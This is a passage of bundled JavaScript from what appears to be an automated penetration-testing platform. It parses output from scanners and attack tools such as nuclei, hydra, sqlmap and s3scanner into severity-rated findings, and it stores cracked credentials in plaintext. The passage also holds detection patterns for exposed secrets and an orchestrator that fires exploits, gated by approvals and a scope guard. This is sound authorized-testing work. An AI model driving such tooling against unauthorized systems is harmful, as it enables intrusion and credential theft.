              const reqStr = typeof obj.request === "string" ? obj.request : "";
              const methodMatch = reqStr.match(/^(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS)\s+(\S+)/);
              if (methodMatch) {
                evidence.request = { ...evidence.request, method: methodMatch[1], url: methodMatch[2] };
              }
              if (reqStr.length > 0) {
                evidence.request = { ...evidence.request, body: reqStr.substring(0, 1e3) };
              }
            }
            if (!evidence.matchedPattern && obj["template-id"]) {
              evidence.matchedPattern = obj["template-id"];
            }
            findings.push({
              severity: obj.info.severity,
              title: `[Nuclei] ${obj.info.name}${matchedAt ? ` @ ${matchedAt}` : ""}`,
              cve,
              description: obj.info.description || void 0,
              cvss: obj.info.classification?.["cvss-score"] || obj.info.classification?.["cvss_score"] || void 0,
              cwe: obj.info.classification?.cwe?.[0] || void 0,
              endpoint: matchedAt || void 0,
              matched_at: matchedAt || void 0,
              evidence: Object.keys(evidence).length > 0 ? evidence : void 0
            });
          }
        } catch {
        }
      }
      break;
    }
    case "nikto": {
      const niktoSkipPatterns = [
        /^\+ Target IP:/i,
        /^\+ Target Hostname:/i,
        /^\+ Target Port:/i,
        /^\+ Start Time:/i,
        /^\+ End Time:/i,
        /^\+ Server:/i,
        /^\+ \d+ host\(s\) tested/i,
        /^\+ \d+ items? checked/i,
        /^\+ No CGI Directories found/i,
        /^\+ ERROR:/i
      ];
      for (const line of stdout.split("\n")) {
        const trimmed = line.trim();
        if (!trimmed.startsWith("+")) continue;
        if (niktoSkipPatterns.some((p) => p.test(trimmed))) continue;
        const cve = trimmed.match(/CVE-\d{4}-\d+/)?.[0];
        const osvdb = trimmed.match(/OSVDB-\d+/)?.[0];
        let severity = "info";
        if (/uncommon header|retrieved.*header/i.test(trimmed)) severity = "info";
        else if (cve) severity = "high";
        else if (osvdb) severity = "medium";
        else if (/is not present|not set|is not defined|header.*missing|missing.*header/i.test(trimmed)) severity = "low";
        else if (/directory indexing|listing|backup|config/i.test(trimmed)) severity = "medium";
        else if (/injection|xss|rfi|lfi|traversal|upload/i.test(trimmed)) severity = "high";
        else if (/default|sample|test|example/i.test(trimmed)) severity = "low";
        findings.push({
          severity,
          title: `[Nikto] ${trimmed.slice(2, 150).trim()}`,
          cve
        });
      }
      break;
    }
    case "httpx": {
      for (const line of stdout.split("\n")) {
        const trimmed = line.trim();
        if (!trimmed) continue;
        try {
          const obj = JSON.parse(trimmed);
          if (obj.tech && Array.isArray(obj.tech)) {
            for (const tech of obj.tech) {
              findings.push({ severity: "info", title: `[httpx] Technology: ${tech}` });
            }
          }
          if (obj.cdn_name) findings.push({ severity: "info", title: `[httpx] CDN/WAF: ${obj.cdn_name}` });
          if (obj.webserver) findings.push({ severity: "info", title: `[httpx] Web Server: ${obj.webserver}` });
          if (obj.status_code) findings.push({ severity: "info", title: `[httpx] ${obj.url || obj.input}: ${obj.status_code} ${obj.title || ""}`.trim() });
          if (obj.tls) {
            if (obj.tls.subject_cn) findings.push({ severity: "info", title: `[httpx] TLS CN: ${obj.tls.subject_cn}` });
            if (obj.tls.subject_org) findings.push({ severity: "info", title: `[httpx] TLS Org: ${obj.tls.subject_org}` });
            if (obj.tls.not_after) findings.push({ severity: "info", title: `[httpx] TLS Expires: ${obj.tls.not_after}` });
          }
          if (asset) {
            if (obj.tech && Array.isArray(obj.tech) && asset.passiveRecon) {
              asset.passiveRecon.technologies = [.../* @__PURE__ */ new Set([...asset.passiveRecon.technologies || [], ...obj.tech])];
            }
            if (obj.webserver && asset.passiveRecon) {
              asset.passiveRecon.technologies = [.../* @__PURE__ */ new Set([...asset.passiveRecon.technologies || [], obj.webserver])];
            }
          }
        } catch {
        }
      }
      break;
    }
    case "naabu": {
      for (const line of stdout.split("\n")) {
        const trimmed = line.trim();
        if (!trimmed) continue;
        try {
          const obj = JSON.parse(trimmed);
          if (obj.port && typeof obj.port === "number") {
            findings.push({ severity: "info", title: `[naabu] Port ${obj.port} open on ${obj.host || obj.ip || "target"}` });
          }
        } catch {
          const portMatch = trimmed.match(/:(\d+)$/);
          if (portMatch) {
            findings.push({ severity: "info", title: `[naabu] Port ${portMatch[1]} open` });
          }
        }
      }
      break;
    }
    case "gobuster": {
      for (const line of stdout.split("\n")) {
        const match = line.match(/\/(\S+)\s+\(Status:\s*(\d+)\)(?:\s+\[Size:\s*(\d+)\])?/);
        if (match) {
          const [, path2, status, sizeStr] = match;
          const size = sizeStr ? parseInt(sizeStr, 10) : void 0;
          if (["200", "301", "302", "401", "403", "405", "500"].includes(status)) {
            let severity;
            if (status === "500") {
              severity = "medium";
            } else if (status === "401" || status === "403") {
              severity = size && size > 500 ? "medium" : "low";
            } else if (status === "200" || status === "301" || status === "302") {
              const sensitivePaths = /\.(env|bak|sql|conf|config|log|old|swp|zip|tar|gz|xml|yml|yaml|json|git|svn|htpasswd|htaccess|DS_Store)/i;
              const adminPaths = /\b(admin|dashboard|panel|manager|console|phpmyadmin|wp-admin|cpanel|debug|server-status|server-info)\b/i;
              if (sensitivePaths.test(path2)) {
                severity = "high";
              } else if (adminPaths.test(path2)) {
                severity = "medium";
              } else {
                severity = "info";
              }
            } else {
              severity = "info";
            }
            const sizeInfo = size !== void 0 ? ` [${size}B]` : "";
            findings.push({
              severity,
              title: `[Gobuster] /${path2} (${status})${sizeInfo}`
            });
          }
        }
      }
      break;
    }
    case "enum4linux": {
      if (stdout.includes("Sharename")) {
        findings.push({ severity: "medium", title: "[enum4linux] SMB shares enumerated" });
      }
      if (stdout.includes("user:")) {
        findings.push({ severity: "medium", title: "[enum4linux] User accounts enumerated via SMB" });
      }
      break;
    }
    case "hydra": {
      const httpGetHits = [];
      const nonHttpGetHits = [];
      for (const line of stdout.split("\n")) {
        if (line.includes("login:") && line.includes("password:")) {
          const loginMatch = line.match(/login:\s*(\S+)/);
          const passMatch = line.match(/password:\s*(\S*)/);
          const svcMatch = line.match(/\[\d+\]\[(\S+)\]/) || line.match(/\[(\S+)\]/);
          const portMatch = line.match(/\[(\d+)\]/);
          const svc = svcMatch?.[1] || "http";
          const port = portMatch ? parseInt(portMatch[1], 10) : asset.ports[0]?.port || 80;
          const hit = {
            line: line.trim(),
            login: loginMatch?.[1] || "",
            pass: passMatch?.[1] || "",
            svc,
            port
          };
          if (svc === "http-get" || svc === "https-get") {
            httpGetHits.push(hit);
          } else {
            nonHttpGetHits.push(hit);
          }
        }
      }
      const isHttpGetFalsePositive = httpGetHits.length >= 3 || httpGetHits.length >= 2 && new Set(httpGetHits.map((h) => h.pass)).size >= 2;
      if (isHttpGetFalsePositive && httpGetHits.length > 0) {
        findings.push({
          severity: "info",
          title: `[Hydra] FALSE POSITIVE: Server returns HTTP 200 for all requests (no HTTP Basic Auth) \u2014 ${httpGetHits.length} credentials reported but server ignores Authorization header`
        });
      } else {
        for (const hit of httpGetHits) {
          findings.push({
            severity: "critical",
            title: `[Hydra] Valid credentials found: ${hit.line.slice(0, 100)}`
          });
          if (asset.confirmedCredentials) {
            asset.confirmedCredentials.push({
              username: hit.login,
              password: hit.pass,
              service: hit.svc,
              port: hit.port,
              protocol: hit.svc.includes("http") ? "http" : "unknown",
              accessLevel: "authenticated",
              source: "hydra",
              responseSnippet: hit.line.slice(0, 200),
              confirmedAt: Date.now()
            });
          }
        }
      }
      for (const hit of nonHttpGetHits) {
        findings.push({
          severity: "critical",
          title: `[Hydra] Valid credentials found: ${hit.line.slice(0, 100)}`
        });
        if (asset.confirmedCredentials) {
          asset.confirmedCredentials.push({
            username: hit.login,
            password: hit.pass,
            service: hit.svc,
            port: hit.port,
            protocol: hit.svc.includes("http") ? "http" : hit.svc || "unknown",
            accessLevel: "authenticated",
            source: "hydra",
            responseSnippet: hit.line.slice(0, 200),
            confirmedAt: Date.now()
          });
        }
      }
      break;
    }
    case "dig": {
      if (stdout.includes("XFR size") || stdout.includes("Transfer")) {
        findings.push({ severity: "high", title: "[dig] DNS Zone Transfer successful" });
      }
      break;
    }
    case "smbclient": {
      if (stdout.includes("Sharename") && !stdout.includes("NT_STATUS_ACCESS_DENIED")) {
        findings.push({ severity: "medium", title: "[smbclient] Anonymous SMB share access" });
      }
      break;
    }
    case "ldapsearch": {
      if (stdout.includes("namingContexts") && !stdout.includes("Operations error")) {
        findings.push({ severity: "medium", title: "[ldapsearch] Anonymous LDAP bind successful" });
      }
      break;
    }
    case "onesixtyone": {
      for (const line of stdout.split("\n")) {
        if (line.includes("[") && !line.includes("Scanning")) {
          findings.push({ severity: "high", title: `[onesixtyone] SNMP community string found: ${line.trim().slice(0, 80)}` });
        }
      }
      break;
    }
    // ─── Cloud Storage & Misconfiguration Tool Parsers ─────────────────────
    case "cloud_enum": {
      for (const line of stdout.split("\n")) {
        const trimmed = line.trim();
        if (!trimmed || trimmed.startsWith("[*]") || trimmed.startsWith("[-]")) continue;
        if (trimmed.includes("s3.amazonaws.com") || trimmed.includes(".s3.")) {
          findings.push({ severity: "high", title: `[cloud_enum] S3 Bucket Discovered: ${trimmed.slice(0, 120)}` });
        } else if (trimmed.includes("blob.core.windows.net")) {
          findings.push({ severity: "high", title: `[cloud_enum] Azure Blob Container Discovered: ${trimmed.slice(0, 120)}` });
        } else if (trimmed.includes("storage.googleapis.com")) {
          findings.push({ severity: "high", title: `[cloud_enum] GCS Bucket Discovered: ${trimmed.slice(0, 120)}` });
        } else if (trimmed.includes("firebaseio.com") || trimmed.includes("firebaseapp.com")) {
          findings.push({ severity: "high", title: `[cloud_enum] Firebase App Discovered: ${trimmed.slice(0, 120)}` });
        } else if (trimmed.includes("digitaloceanspaces.com")) {
          findings.push({ severity: "high", title: `[cloud_enum] DO Spaces Bucket Discovered: ${trimmed.slice(0, 120)}` });
        } else if (trimmed.includes("[OPEN]") || trimmed.includes("OPEN") || trimmed.includes("200")) {
          findings.push({ severity: "critical", title: `[cloud_enum] Open Cloud Resource: ${trimmed.slice(0, 120)}` });
        }
      }
      break;
    }
    case "s3scanner": {
      for (const line of stdout.split("\n")) {
        const trimmed = line.trim();
        if (!trimmed) continue;
        try {
          const obj = JSON.parse(trimmed);
          const bucket = obj.bucket || obj.name || "unknown";
          if (obj.exists === false) continue;
          if (obj.public_read || obj.AuthUsers_read) {
            findings.push({ severity: "critical", title: `[s3scanner] PUBLIC READ: s3://${bucket} \u2014 data exposure risk` });
          }
          if (obj.public_write || obj.AuthUsers_write) {
            findings.push({ severity: "critical", title: `[s3scanner] PUBLIC WRITE: s3://${bucket} \u2014 bucket takeover risk` });
          }
          if (obj.public_read_acp || obj.AuthUsers_read_acp) {
            findings.push({ severity: "high", title: `[s3scanner] ACL Readable: s3://${bucket} \u2014 permission enumeration` });
          }
          if (obj.exists && !obj.public_read && !obj.public_write) {
            findings.push({ severity: "info", title: `[s3scanner] Bucket exists (private): s3://${bucket}` });
          }
        } catch {
          if (trimmed.includes("READ") || trimmed.includes("ListBucket")) {
            findings.push({ severity: "critical", title: `[s3scanner] Public Access: ${trimmed.slice(0, 120)}` });
          } else if (trimmed.includes("WRITE") || trimmed.includes("PutObject")) {
            findings.push({ severity: "critical", title: `[s3scanner] Write Access: ${trimmed.slice(0, 120)}` });
          } else if (trimmed.includes("exists") || trimmed.includes("bucket_exists")) {
            findings.push({ severity: "info", title: `[s3scanner] ${trimmed.slice(0, 120)}` });
          }
        }
      }
      break;
    }
    case "trufflehog": {
      for (const line of stdout.split("\n")) {
        const trimmed = line.trim();
        if (!trimmed) continue;
        try {
          const obj = JSON.parse(trimmed);
          if (obj.DetectorName || obj.detector_name) {
            const detector = obj.DetectorName || obj.detector_name || "Unknown";
            const source = obj.SourceMetadata?.Data?.S3?.bucket || obj.source || "unknown";
            const verified = obj.Verified || obj.verified ? "VERIFIED" : "unverified";
            findings.push({
              severity: obj.Verified || obj.verified ? "critical" : "high",
              title: `[trufflehog] ${verified} Secret (${detector}) in ${source}`
            });
          }
        } catch {
        }
      }
      break;
    }
    case "aws": {
      if (stdout.includes("NoSuchBucket")) {
        findings.push({ severity: "high", title: `[aws] Subdomain Takeover Candidate: NoSuchBucket response` });
      } else if (stdout.includes("AccessDenied") || stdout.includes("Access Denied")) {
        findings.push({ severity: "info", title: `[aws] Bucket exists but access denied (private)` });
      } else if (stdout.includes("AllAccessDisabled")) {
        findings.push({ severity: "info", title: `[aws] Bucket exists but all access disabled` });
      } else {
        const objectLines = stdout.split("\n").filter((l) => l.trim() && !l.includes("PRE "));
        if (objectLines.length > 0) {
          findings.push({ severity: "critical", title: `[aws] PUBLIC S3 Bucket \u2014 ${objectLines.length} objects listed anonymously` });
          for (const line of objectLines.slice(0, 5)) {
            const parts = line.trim().split(/\s+/);
            const filename = parts[parts.length - 1];
            if (filename && filename !== "None") {
              findings.push({ severity: "high", title: `[aws] Exposed file: ${filename}` });
            }
          }
        }
        const prefixes = stdout.split("\n").filter((l) => l.includes("PRE "));
        if (prefixes.length > 0) {
          findings.push({ severity: "high", title: `[aws] Public bucket with ${prefixes.length} directories` });
        }
      }
      break;
    }
    case "bash": {
      if (stdout.includes("firebaseio.com")) {
        try {
          const obj = JSON.parse(stdout);
          if (obj && Object.keys(obj).length > 0 && !obj.error) {
            findings.push({ severity: "critical", title: `[Firebase] Database publicly readable \u2014 ${Object.keys(obj).length} top-level keys exposed` });
          }
        } catch {
          if (!stdout.includes("Permission denied") && !stdout.includes("null") && stdout.length > 5) {
            findings.push({ severity: "high", title: `[Firebase] Possible public database access` });
          }
        }
      }
      if (stdout.includes("ListBucketResult") || stdout.includes("<Contents>")) {
        findings.push({ severity: "critical", title: `[curl] S3 Bucket Directory Listing Enabled` });
      }
      if (stdout.includes("BlobNotFound") || stdout.includes("ContainerNotFound")) {
        findings.push({ severity: "high", title: `[curl] Azure Blob Subdomain Takeover Candidate` });
      }
      if (stdout.includes("NoSuchBucket")) {
        findings.push({ severity: "high", title: `[curl] S3 Subdomain Takeover Candidate \u2014 NoSuchBucket` });
      }
      break;
    }
    case "ffuf": {
      for (const line of stdout.split("\n")) {
        const trimmed = line.trim();
        if (!trimmed) continue;
        try {
          const obj = JSON.parse(trimmed);
          if (obj.results && Array.isArray(obj.results)) {
            for (const r of obj.results) {
              const status = r.status || r.StatusCode;
              const url = r.url || r.Url || "";
              if (status && [200, 301, 302, 401, 403, 500].includes(status)) {
                findings.push({ severity: status === 500 ? "medium" : "info", title: `[ffuf] ${url} (${status}, ${r.length || "?"}B)` });
              }
            }
          }
        } catch {
          const match = trimmed.match(/(https?:\/\/\S+)\s+\[Status:\s*(\d+)/);
          if (match) findings.push({ severity: "info", title: `[ffuf] ${match[1]} (${match[2]})` });
        }
      }
      break;
    }
    case "sslscan": {
      if (stdout.includes("SSLv2") && !stdout.includes("SSLv2 disabled")) findings.push({ severity: "critical", title: "[sslscan] SSLv2 enabled" });
      if (stdout.includes("SSLv3") && !stdout.includes("SSLv3 disabled")) findings.push({ severity: "high", title: "[sslscan] SSLv3 enabled (POODLE)" });
      if (/TLSv1\.0.*enabled/i.test(stdout)) findings.push({ severity: "medium", title: "[sslscan] TLS 1.0 enabled" });
      if (/Heartbleed.*vulnerable/i.test(stdout)) findings.push({ severity: "critical", title: "[sslscan] Heartbleed", cve: "CVE-2014-0160" });
      if (/RC4|DES|NULL|EXPORT/i.test(stdout)) findings.push({ severity: "high", title: "[sslscan] Weak cipher suites accepted" });
      if (/self.signed/i.test(stdout)) findings.push({ severity: "medium", title: "[sslscan] Self-signed certificate" });
      if (/expired/i.test(stdout)) findings.push({ severity: "high", title: "[sslscan] Expired certificate" });
      break;
    }
    case "whatweb": {
      for (const line of stdout.split("\n")) {
        const trimmed = line.trim();
        if (!trimmed || trimmed.startsWith("WhatWeb") || trimmed.startsWith("ERROR")) continue;
        const urlMatch = trimmed.match(/^(https?:\/\/\S+)/);
        const url = urlMatch ? urlMatch[1] : "";
        const techMatches = trimmed.match(/\[([^\]]+)\]/g);
        if (techMatches) {
          for (const tech of techMatches) {
            const techName = tech.slice(1, -1);
            if (techName.length > 2 && !techName.match(/^\d{3}$/)) {
              findings.push({ severity: "info", title: `[whatweb] ${techName}${url ? ` @ ${url}` : ""}` });
            }
          }
        }
      }
      break;
    }
    case "subfinder": {
      for (const line of stdout.split("\n")) {
        const trimmed = line.trim();
        if (trimmed && trimmed.includes(".") && !trimmed.startsWith("[")) {
          findings.push({ severity: "info", title: `[subfinder] Subdomain: ${trimmed}` });
        }
      }
      break;
    }
    case "feroxbuster": {
      for (const line of stdout.split("\n")) {
        const trimmed = line.trim();
        if (!trimmed) continue;
        try {
          const obj = JSON.parse(trimmed);
          const status = obj.status || obj.status_code;
          const url = obj.url || obj.original_url || "";
          const length = obj.content_length || obj.length || "?";
          if (status && [200, 301, 302, 401, 403, 500].includes(status)) {
            let severity = "info";
            if (status === 500) severity = "medium";
            else if (status === 401 || status === 403) severity = "low";
            else if (/admin|config|backup|\.env|\.git|\.sql|\.bak|upload|dashboard|secret|password/i.test(url)) severity = "medium";
            findings.push({ severity, title: `[feroxbuster] ${url} (${status}, ${length}B)` });
          }
        } catch {
          const match = trimmed.match(/(\d{3})\s+\d+\w?\s+\d+\w?\s+\d+\w?\s+(\S+)/);
          if (match) {
            const [, status, url] = match;
            findings.push({ severity: "info", title: `[feroxbuster] ${url} (${status})` });
          }
        }
      }
      break;
    }
    case "sqlmap": {
      for (const line of stdout.split("\n")) {
        const trimmed = line.trim();
        if (!trimmed) continue;
        if (/Parameter.*is vulnerable/i.test(trimmed) || /injectable/i.test(trimmed)) {
          findings.push({ severity: "critical", title: `[sqlmap] SQL Injection Confirmed: ${trimmed.slice(0, 150)}` });
        } else if (/back-end DBMS/i.test(trimmed)) {
          findings.push({ severity: "high", title: `[sqlmap] ${trimmed.slice(0, 150)}` });
        } else if (/available databases/i.test(trimmed) || /Database:/i.test(trimmed)) {
          findings.push({ severity: "critical", title: `[sqlmap] Database Enumerated: ${trimmed.slice(0, 150)}` });
        } else if (/Table:/i.test(trimmed) || /\d+ entries/i.test(trimmed)) {
          findings.push({ severity: "critical", title: `[sqlmap] Data Extracted: ${trimmed.slice(0, 150)}` });
        } else if (/os-shell|file-read|file-write/i.test(trimmed)) {
          findings.push({ severity: "critical", title: `[sqlmap] OS-level Access: ${trimmed.slice(0, 150)}` });
        } else if (/Type:\s*(boolean|time|error|UNION|stacked)/i.test(trimmed)) {
          findings.push({ severity: "high", title: `[sqlmap] Injection Type: ${trimmed.slice(0, 150)}` });
        }
      }
      break;
    }
    case "amass": {
      for (const line of stdout.split("\n")) {
        const trimmed = line.trim();
        if (!trimmed || trimmed.startsWith("Querying") || trimmed.startsWith("OWASP") || trimmed.startsWith("The enumeration")) continue;
        try {
          const obj = JSON.parse(trimmed);
          if (obj.name) {
            const sources = obj.sources?.join(", ") || "";
            findings.push({ severity: "info", title: `[amass] ${obj.name}${obj.addresses ? ` \u2192 ${obj.addresses.map((a) => a.ip).join(", ")}` : ""}${sources ? ` (${sources})` : ""}` });
          }
          continue;
        } catch {
        }
        if (trimmed.includes(".") && !trimmed.includes(" ")) {
          findings.push({ severity: "info", title: `[amass] Subdomain: ${trimmed}` });
        } else if (/ASN|CIDR|Netblock/i.test(trimmed)) {
          findings.push({ severity: "info", title: `[amass] Infrastructure: ${trimmed.slice(0, 150)}` });
        }
      }
      break;
    }
    case "katana": {
      for (const line of stdout.split("\n")) {
        const trimmed = line.trim();
        if (trimmed && trimmed.startsWith("http")) {
          const isInteresting = /admin|login|api|config|backup|upload|dashboard|\.env|\.git/i.test(trimmed);
          if (isInteresting) findings.push({ severity: "medium", title: `[katana] Interesting URL: ${trimmed.slice(0, 150)}` });
        }
      }
      break;
    }
    case "gospider": {
      for (const line of stdout.split("\n")) {
        const trimmed = line.trim();
        if (!trimmed) continue;
        if (trimmed.includes("[form]")) findings.push({ severity: "medium", title: `[gospider] Form: ${trimmed.slice(0, 150)}` });
        else if ((trimmed.includes("[javascript]") || trimmed.includes("[linkfinder]")) && /api|token|key|secret|admin/i.test(trimmed)) {
          findings.push({ severity: "medium", title: `[gospider] JS endpoint: ${trimmed.slice(0, 150)}` });
        }
      }
      break;
    }
    case "waybackurls":
    case "gau": {
      const toolLabel = tool;
      let totalUrls = 0;
      for (const line of stdout.split("\n")) {
        const trimmed = line.trim();
        if (!trimmed || !trimmed.startsWith("http")) continue;
        totalUrls++;
        if (/admin|login|api|config|backup|\.env|\.git|\.sql|\.bak|\.zip|password|secret|token/i.test(trimmed)) {
          findings.push({ severity: "medium", title: `[${toolLabel}] Interesting URL: ${trimmed.slice(0, 150)}` });
        }
      }
      if (totalUrls > 0) findings.push({ severity: "info", title: `[${toolLabel}] ${totalUrls} historical URLs` });
      break;
    }
    case "curl": {
      if (stdout.includes("ListBucketResult") || stdout.includes("<Contents>")) findings.push({ severity: "critical", title: "[curl] S3 Bucket Directory Listing" });
      if (stdout.includes("NoSuchBucket")) findings.push({ severity: "high", title: "[curl] S3 Subdomain Takeover Candidate" });
      if (stdout.includes("BlobNotFound") || stdout.includes("ContainerNotFound")) findings.push({ severity: "high", title: "[curl] Azure Blob Takeover Candidate" });
      const headerLines = stdout.split("\n");
      const serverHeader = headerLines.find((l) => /^server:/i.test(l.trim()));
      if (serverHeader) findings.push({ severity: "info", title: `[curl] ${serverHeader.trim()}` });
      break;
    }
    case "wpscan": {
      for (const line of stdout.split("\n")) {
        const trimmed = line.trim();
        if (trimmed.includes("[!]") || trimmed.includes("[+]")) {
          const cve = trimmed.match(/CVE-\d{4}-\d+/)?.[0];
          if (cve || /vulnerability|outdated|insecure/i.test(trimmed)) {
            findings.push({ severity: cve ? "high" : "medium", title: `[wpscan] ${trimmed.slice(0, 150)}`, cve });
          }
        }
      }
      break;
    }
    case "testssl": {
      for (const line of stdout.split("\n")) {
        if (/VULNERABLE/i.test(line)) {
          const cve = line.match(/CVE-\d{4}-\d+/)?.[0];
          findings.push({ severity: cve ? "critical" : "high", title: `[testssl] ${line.trim().slice(0, 150)}`, cve });
        }
      }
      if (/NOT\s+ok/i.test(stdout)) findings.push({ severity: "medium", title: "[testssl] TLS configuration issues" });
      break;
    }
    case "scanforge-discovery": {
      const portRegex = /^(\d+)\/tcp\s+(open|filtered)\s+(\S+)\s*(.*)/;
      for (const line of stdout.split("\n")) {
        const trimmed = line.trim();
        const portMatch = trimmed.match(portRegex);
        if (portMatch && portMatch[2] === "open") {
          findings.push({ severity: "info", title: `[ScanForge] ${portMatch[1]}/tcp ${portMatch[3]}${portMatch[4] ? " " + portMatch[4].trim() : ""}` });
        }
        const cveMatch = trimmed.match(/CVE-\d{4}-\d+/g);
        if (cveMatch) {
          for (const cve of cveMatch) {
            findings.push({ severity: "high", title: `[ScanForge] ${cve} \u2014 ${trimmed.slice(0, 120)}`, cve });
          }
        }
        if (/VULNERABLE/i.test(trimmed)) findings.push({ severity: "high", title: `[ScanForge] ${trimmed.slice(0, 150)}` });
        if (/message_signing.*disabled/i.test(trimmed)) findings.push({ severity: "medium", title: "[ScanForge] SMB signing disabled" });
        if (/Anonymous FTP login allowed/i.test(trimmed)) findings.push({ severity: "high", title: "[ScanForge] Anonymous FTP login" });
      }
      break;
    }
    default:
      break;
  }
  return findings;
}
var init_tool_output_parsers = __esm({
  "server/lib/tool-output-parsers.ts"() {
    "use strict";
  }
});

// server/lib/engagement-orchestrator.ts
var engagement_orchestrator_exports = {};
__export(engagement_orchestrator_exports, {
  KNOWN_INFRA_IPS: () => KNOWN_INFRA_IPS,
  MAX_CONCURRENT_ENGAGEMENTS: () => MAX_CONCURRENT_ENGAGEMENTS,
  abortEngagement: () => abortEngagement,
  addLog: () => addLog,
  auditLog: () => auditLog,
  broadcastCredentialFound: () => broadcastCredentialFound,
  broadcastExploitFired: () => broadcastExploitFired,
  broadcastExploitResult: () => broadcastExploitResult,
  broadcastOpsUpdate: () => broadcastOpsUpdate,
  broadcastReconFinding: () => broadcastReconFinding,
  clearOpsState: () => clearOpsState,
  dismissAllStaleApprovals: () => dismissAllStaleApprovals,
  dismissStaleApproval: () => dismissStaleApproval,
  executeEngagement: () => executeEngagement,
  executeVulnDetection: () => executeVulnDetection,
  flushAllPendingState: () => flushAllPendingState,
  generateScanPlan: () => generateScanPlan,
  getApprovalGateDetail: () => getApprovalGateDetail,
  getEffectiveTarget: () => getEffectiveTarget,
  getEngagementAbortSignal: () => getEngagementAbortSignal,
  getHealthStatus: () => getHealthStatus,
  getOpsState: () => getOpsState,
  getOpsStateWithRecovery: () => getOpsStateWithRecovery,
  initOpsState: () => initOpsState,
  isInRoeScope: () => isInRoeScope,
  llmDecide: () => llmDecide,
  normalizeOpsState: () => normalizeOpsState,
  persistOpsStateDebounced: () => persistOpsStateDebounced,
  persistOpsStateNow: () => persistOpsStateNow,
  persistScanResult: () => persistScanResult,
  pushVulnDeduped: () => pushVulnDeduped,
  recoverInterruptedEngagements: () => recoverInterruptedEngagements,
  requestApproval: () => requestApproval,
  rerunFromPhase: () => rerunFromPhase,
  rescanAssetWithDeeperProfile: () => rescanAssetWithDeeperProfile,
  resolveApproval: () => resolveApproval,
  resumeEngagement: () => resumeEngagement,
  startMemoryWatchdog: () => startMemoryWatchdog,
  stopEngagement: () => stopEngagement,
  stopMemoryWatchdog: () => stopMemoryWatchdog
});
function fmtTarget(asset, fallbackTarget) {
  if (!asset) return fallbackTarget || "unknown";
  if (asset.ip && asset.ip !== asset.hostname) return `${asset.hostname} (${asset.ip})`;
  return asset.hostname;
}
function getEffectiveTarget(asset, mode = "http") {
  if (!asset.ip) return asset.hostname;
  if (!asset.hostname || asset.hostname === asset.ip) return asset.ip;
  if (mode === "http" && KNOWN_INFRA_IPS.has(asset.ip)) {
    return asset.hostname;
  }
  if (mode === "discovery") {
    return asset.ip;
  }
  if (mode === "metadata") {
    return asset.hostname;
  }
  return asset.hostname;
}
function genId() {
  return `ops-${Date.now()}-${++idCounter}`;
}
function pushVulnDeduped(asset, vuln) {
  const isDuplicate = asset.vulns.some((existing) => {
    if (vuln.cve && existing.cve && vuln.cve === existing.cve) return true;
    if (existing.title === vuln.title) return true;
    return false;
  });
  if (isDuplicate) return false;
  if (!vuln.vulnClass || vuln.vulnClass === "unknown") {
    vuln.vulnClass = classifyVulnClass(vuln.title, vuln.description);
  }
  asset.vulns.push(vuln);
  return true;
}
function getOpsState(engagementId) {
  return opsStates.get(engagementId) || null;
}
async function clearOpsState(engagementId) {
  opsStates.delete(engagementId);
  const timer = persistTimers.get(engagementId);
  if (timer) {
    clearTimeout(timer);
    persistTimers.delete(engagementId);
  }
  try {
    const { deleteOpsSnapshot } = await import("./db-D773P4Y2.js");
    await deleteOpsSnapshot(engagementId);
  } catch (e) {
    console.error(`[OpsState] Failed to delete DB snapshot for #${engagementId}:`, e.message);
  }
}
function normalizeOpsState(state) {
  if (!Array.isArray(state.assets)) state.assets = [];
  if (!Array.isArray(state.log)) state.log = [];
  if (!Array.isArray(state.approvalGates)) state.approvalGates = [];
  const defaultStats = {
    hostsScanned: 0,
    portsFound: 0,
    vulnsFound: 0,
    exploitsAttempted: 0,
    exploitsSucceeded: 0,
    sessionsOpened: 0,
    zapScansRun: 0,
    wafDetections: 0
  };
  state.stats = { ...defaultStats, ...state.stats || {} };
  if (state.skippedDomains && !(state.skippedDomains instanceof Set)) {
    try {
      const arr = Array.isArray(state.skippedDomains) ? state.skippedDomains : Object.values(state.skippedDomains);
      state.skippedDomains = new Set(arr);
    } catch {
      state.skippedDomains = /* @__PURE__ */ new Set();
    }
  } else if (!state.skippedDomains) {
    state.skippedDomains = /* @__PURE__ */ new Set();
  }
  const defaultCompletedScans = {
    nucleiCompleted: /* @__PURE__ */ new Set(),
    zapCompleted: /* @__PURE__ */ new Set(),
    hydraCompleted: /* @__PURE__ */ new Set(),
    exploitCompleted: /* @__PURE__ */ new Set(),
    katanaCompleted: /* @__PURE__ */ new Set(),
    feroxbusterCompleted: /* @__PURE__ */ new Set(),
    ffufCompleted: /* @__PURE__ */ new Set(),
    testsslCompleted: /* @__PURE__ */ new Set(),
    paramDiscoveryCompleted: /* @__PURE__ */ new Set(),
    wafw00fCompleted: /* @__PURE__ */ new Set(),
    burpCompleted: /* @__PURE__ */ new Set(),
    lastCheckpointAt: Date.now()
  };
  if (state.completedScans) {
    for (const key of [
      "nucleiCompleted",
      "zapCompleted",
      "hydraCompleted",
      "exploitCompleted",
      "katanaCompleted",
      "feroxbusterCompleted",
      "ffufCompleted",
      "testsslCompleted",
      "paramDiscoveryCompleted",
      "wafw00fCompleted",
      "burpCompleted"
    ]) {
      const val = state.completedScans[key];
      if (val && !(val instanceof Set)) {
        try {
          const arr = Array.isArray(val) ? val : Object.values(val);
          state.completedScans[key] = new Set(arr);
        } catch {
          state.completedScans[key] = /* @__PURE__ */ new Set();
        }
      } else if (!val) {
        state.completedScans[key] = /* @__PURE__ */ new Set();
      }
    }
    if (typeof state.completedScans.lastCheckpointAt !== "number") {
      state.completedScans.lastCheckpointAt = Date.now();
    }
  } else {
    state.completedScans = defaultCompletedScans;
  }
  if (typeof state.isRunning !== "boolean") state.isRunning = false;
  if (typeof state.isPaused !== "boolean") state.isPaused = false;
  if (state.trainingLabMode !== void 0 && typeof state.trainingLabMode !== "boolean") {
    state.trainingLabMode = Boolean(state.trainingLabMode);
  }
  if (!state.phase) state.phase = "idle";
  if (typeof state.progress !== "number") state.progress = 0;
  if (state.roeScopeGuard) {
    if (!Array.isArray(state.roeScopeGuard.authorizedDomains)) state.roeScopeGuard.authorizedDomains = [];
    if (!Array.isArray(state.roeScopeGuard.authorizedIps)) state.roeScopeGuard.authorizedIps = [];
  }
  for (const asset of state.assets) {
    if (!Array.isArray(asset.vulns)) asset.vulns = [];
    if (!Array.isArray(asset.pendingVulns)) asset.pendingVulns = [];
    if (!Array.isArray(asset.toolResults)) asset.toolResults = [];
